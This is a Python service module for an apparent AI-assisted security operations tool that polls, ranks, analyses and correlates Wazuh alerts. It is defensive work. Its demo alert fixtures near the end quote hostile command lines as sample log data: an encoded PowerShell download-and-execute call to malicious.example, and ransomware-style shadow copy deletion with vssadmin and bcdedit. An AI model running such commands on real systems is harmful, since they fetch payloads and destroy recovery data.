"""Real-time alert polling and analysis service."""

import asyncio
import logging
from collections.abc import AsyncGenerator
from datetime import datetime, timezone
from typing import Any

from soc_analyst.agents.prioritizer import AlertPrioritizer
from soc_analyst.agents.soc_analyst import SOCAnalystAgent
from soc_analyst.connectors.elasticsearch_client import ElasticsearchClient
from soc_analyst.config import get_settings, PROJECT_ROOT
from soc_analyst.mitre.attack_mapper import MitreAttackMapper
from soc_analyst.models.schemas import AlertAnalysis, SecurityAlert
from soc_analyst.services.live_alert_fetcher import LiveAlertFetcher

logger = logging.getLogger(__name__)


class AlertProcessor:
    """Polls Elasticsearch for new Wazuh alerts and analyzes them in real time."""

    def __init__(self) -> None:
        self.es = ElasticsearchClient()
        self.live_fetcher = LiveAlertFetcher()
        self._agent: SOCAnalystAgent | None = None
        self.prioritizer = AlertPrioritizer()
        self.mitre = MitreAttackMapper()
        
        self.seen_ids_file = PROJECT_ROOT / "config" / "seen_ids.txt"
        self.analysis_cache_file = PROJECT_ROOT / "config" / "analysis_cache.json"
        self._analysis_cache: dict[str, AlertAnalysis] = {}
        self._alerts_cache: dict[str, SecurityAlert] = {}
        self._incident_cache: list[Any] = []
        self._incident_statuses: dict[str, str] = {}
        self._seen_ids: set[str] = set()
        self._running = False

        self._load_caches()

        # Initialize incidents cache on startup
        try:
            self.update_incidents()
        except Exception as e:
            logger.warning("Could not initialize incident cache on startup: %s", e)

    def _load_caches(self) -> None:
        """Loads persistent analysis cache and seen IDs if present."""
        import json
        try:
            if self.seen_ids_file.exists():
                lines = self.seen_ids_file.read_text(encoding="utf-8").splitlines()
                self._seen_ids = {line.strip() for line in lines if line.strip()}
                logger.info("Loaded %d seen alert IDs from disk", len(self._seen_ids))
        except Exception as e:
            logger.warning("Failed to load seen_ids: %s", e)

        try:
            if self.analysis_cache_file.exists():
                data = json.loads(self.analysis_cache_file.read_text(encoding="utf-8"))
                for aid, a_dict in data.items():
                    try:
                        self._analysis_cache[aid] = AlertAnalysis.model_validate(a_dict)
                    except Exception:
                        pass
                logger.info("Loaded %d cached analyses from disk", len(self._analysis_cache))
        except Exception as e:
            logger.warning("Failed to load analysis_cache: %s", e)

    def _save_caches(self) -> None:
        """Persists analysis cache and seen IDs to disk."""
        import json
        try:
            self.seen_ids_file.parent.mkdir(parents=True, exist_ok=True)
            self.seen_ids_file.write_text("\n".join(list(self._seen_ids)[-5000:]), encoding="utf-8")
        except Exception as e:
            logger.warning("Failed to save seen_ids: %s", e)

        try:
            self.analysis_cache_file.parent.mkdir(parents=True, exist_ok=True)
            # Store the most recent 1000 analyses
            keys_to_save = list(self._analysis_cache.keys())[-1000:]
            data = {k: self._analysis_cache[k].model_dump(mode="json") for k in keys_to_save}
            self.analysis_cache_file.write_text(json.dumps(data, indent=2), encoding="utf-8")
        except Exception as e:
            logger.warning("Failed to save analysis_cache: %s", e)

    @property
    def agent(self) -> SOCAnalystAgent:
        if self._agent is None:
            self._agent = SOCAnalystAgent()
        return self._agent

    @property
    def cache(self) -> dict[str, AlertAnalysis]:
        return self._analysis_cache

    async def analyze_single(self, alert: SecurityAlert) -> AlertAnalysis:
        # Check if already analyzed to prevent repeated LLM calls
        if alert.id in self._analysis_cache:
            logger.info("Alert %s already analyzed. Returning cached analysis without LLM invocation.", alert.id)
            self._seen_ids.add(alert.id)
            self._alerts_cache[alert.id] = alert
            try:
                self.update_incidents()
            except Exception as e:
                logger.warning("Failed to update incidents cache: %s", e)
            return self._analysis_cache[alert.id]

        if alert.id.startswith("demo-"):
            related = []
        else:
            try:
                related = self.es.get_related_events(alert)
            except Exception as e:
                logger.warning("Failed to fetch related events from Elasticsearch: %s", e)
                related = []
        analysis = await asyncio.to_thread(self.agent.analyze_alert, alert, related)
        self._analysis_cache[alert.id] = analysis
        self._alerts_cache[alert.id] = alert
        self._seen_ids.add(alert.id)
        self._save_caches()
        
        # Update incidents cache with newly analyzed alert context
        try:
            await asyncio.to_thread(self.update_incidents)
        except Exception as e:
            logger.warning("Failed to update incidents cache after analysis: %s", e)

        return analysis

    async def analyze_by_id(self, alert_id: str) -> AlertAnalysis | None:
        if alert_id.startswith("demo-"):
            alert = next((a for a in self.seed_demo_alerts() if a.id == alert_id), None)
        else:
            try:
                alert = self.es.get_alert_by_id(alert_id)
            except Exception as e:
                logger.warning("Failed to fetch alert %s from Elasticsearch: %s", alert_id, e)
                alert = None
        if not alert:
            return None
        return await self.analyze_single(alert)

    def record_live_alert(self, alert: SecurityAlert) -> None:
        """Stores an alert arriving from the live monitoring pipeline."""
        self._alerts_cache[alert.id] = alert

    async def get_prioritized_queue(
        self, hours_back: int = 24, limit: int = 50, mode: str = "live"
    ) -> list[dict]:
        if mode == "demo":
            alerts = self.seed_demo_alerts()
        elif mode == "live":
            # Live mode: return alerts ingested and verified by the live monitoring pipeline
            # Exclude seeded demo alerts
            alerts = [
                a for a in self._alerts_cache.values()
                if not a.id.startswith("demo-")
            ]
            # Sort newest first up to limit
            alerts.sort(key=lambda x: x.timestamp, reverse=True)
            alerts = alerts[:limit]
        elif mode == "history":
            # Historical backlog search in OpenSearch / Elasticsearch
            try:
                alerts = self.es.search_alerts(hours_back=hours_back, limit=limit)
            except Exception as e:
                logger.error("Failed to fetch alerts from Elasticsearch: %s.", e)
                alerts = []
            for a in alerts:
                self._alerts_cache[a.id] = a
        else:
            # Fallback
            try:
                alerts = self.es.search_alerts(hours_back=hours_back, limit=limit)
            except Exception as e:
                logger.error("Failed to fetch alerts from Elasticsearch: %s.", e)
                alerts = []
            for a in alerts:
                self._alerts_cache[a.id] = a

        mitre_map = {a.id: self.mitre.map_alert(a) for a in alerts}
        ranked = self.prioritizer.rank_alerts(alerts, mitre_map)

        return [
            {
                "alert": alert.model_dump(),
                "priority_score": score,
                "severity": severity.value,
                "mitre_count": len(mitre_map.get(alert.id, [])),
                "analyzed": alert.id in self._analysis_cache,
            }
            for alert, score, severity in ranked
        ]

    async def stream_new_alerts(self) -> AsyncGenerator[AlertAnalysis, None]:
        self._running = True

        while self._running:
            try:
                new_alerts = await self.live_fetcher.fetch_new_alerts()
                for alert in new_alerts:
                    analysis = await self.analyze_single(alert)
                    yield analysis

            except Exception as exc:
                logger.error("Alert poll error: %s", exc)

            await asyncio.sleep(self.live_fetcher.polling_interval)

    def stop(self) -> None:
        self._running = False

    def get_cached_analysis(self, alert_id: str) -> AlertAnalysis | None:
        return self._analysis_cache.get(alert_id)

    def get_all_alerts(self, hours_back: int = 24, limit: int = 100) -> list[SecurityAlert]:
        try:
            alerts = self.es.search_alerts(hours_back=hours_back, limit=limit)
            if not alerts:
                alerts = self.seed_demo_alerts()
            return alerts
        except Exception:
            return self.seed_demo_alerts()

    def get_correlated_incidents(self, mode: str = "live", hours_back: int = 24, limit: int = 100) -> list[dict]:
        from soc_analyst.services.correlation import AlertCorrelator
        if mode == "demo":
            alerts = self.seed_demo_alerts()
        elif mode == "live":
            alerts = [a for a in self._alerts_cache.values() if not a.id.startswith("demo-")]
        elif mode == "history":
            alerts = self.get_all_alerts(hours_back=hours_back, limit=limit)
        else:
            alerts = list(self._alerts_cache.values())

        if not alerts:
            return []

        try:
            correlated = AlertCorrelator.correlate(alerts, time_window_seconds=get_settings().incident_time_window)
            incidents_list = []
            for inc in correlated:
                if inc.incident_id not in self._incident_statuses:
                    self._incident_statuses[inc.incident_id] = "Open"
                inc_dict = inc.model_dump()
                inc_dict["status"] = self._incident_statuses[inc.incident_id]
                incidents_list.append(inc_dict)
            return incidents_list
        except Exception as e:
            logger.error("Failed to correlate incidents: %s", e)
            return []

    def update_incident_cache(self, alerts: list[SecurityAlert]) -> None:
        from soc_analyst.services.correlation import AlertCorrelator
        try:
            correlated = AlertCorrelator.correlate(alerts, time_window_seconds=get_settings().incident_time_window)
            self._incident_cache = []
            for inc in correlated:
                # Add status if not exists
                if inc.incident_id not in self._incident_statuses:
                    self._incident_statuses[inc.incident_id] = "Open"
                # Dump incident with status
                inc_dict = inc.model_dump()
                inc_dict["status"] = self._incident_statuses[inc.incident_id]
                self._incident_cache.append(inc_dict)
            logger.info("Incident cache updated: %d incidents", len(self._incident_cache))
        except Exception as e:
            logger.error("Failed to update incident cache: %s", e)

    def update_incidents(self) -> None:
        # Prioritize live alerts if present; otherwise correlate whatever alerts are in _alerts_cache (e.g. demo alerts during demo run)
        live_alerts = [a for a in self._alerts_cache.values() if not a.id.startswith("demo-")]
        if live_alerts:
            self.update_incident_cache(live_alerts)
        elif self._alerts_cache:
            self.update_incident_cache(list(self._alerts_cache.values()))
        else:
            self._incident_cache = []

    def seed_demo_alerts(self) -> list[SecurityAlert]:
        """Sample alerts for offline/demo mode without Elasticsearch."""
        now = datetime.now(timezone.utc)
        from datetime import timedelta
        return [
            SecurityAlert(
                id="demo-001",
                timestamp=now - timedelta(minutes=15),
                rule_id="5710",
                rule_description="Multiple authentication failures",
                rule_level=10,
                agent_name="web-server-01",
                agent_ip="10.0.1.15",
                source_ip="203.0.113.45",
                destination_ip="10.0.1.15",
                username="admin",
                full_log=(
                    "Failed password for admin from 203.0.113.45 port 54321 ssh2. "
                    "Multiple failed login attempts detected in 60 seconds."
                ),
            ),
            SecurityAlert(
                id="demo-002",
                timestamp=now - timedelta(minutes=10),
                rule_id="92002",
                rule_description="Suspicious PowerShell command detected",
                rule_level=12,
                agent_name="web-server-01",
                agent_ip="10.0.1.15",
                source_ip="203.0.113.45",
                destination_ip="10.0.1.15",
                username="admin",
                full_log=(
                    "powershell.exe -EncodedCommand "
                    "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAuAE4AZQB0AC4AU"
                    "WebClient).DownloadString('http://malicious.example/payload')"
                ),
            ),
            SecurityAlert(
                id="demo-003",
                timestamp=now - timedelta(minutes=5),
                rule_id="87105",
                rule_description="Possible ransomware activity - shadow copy deletion",
                rule_level=15,
                agent_name="web-server-01",
                agent_ip="10.0.1.15",
                source_ip="203.0.113.45",
                destination_ip="10.0.1.15",
                username="SYSTEM",
                full_log=(
                    "vssadmin.exe Delete Shadows /All /Quiet executed. "
                    "bcdedit /set {default} recoveryenabled No detected."
                ),
            ),
        ]
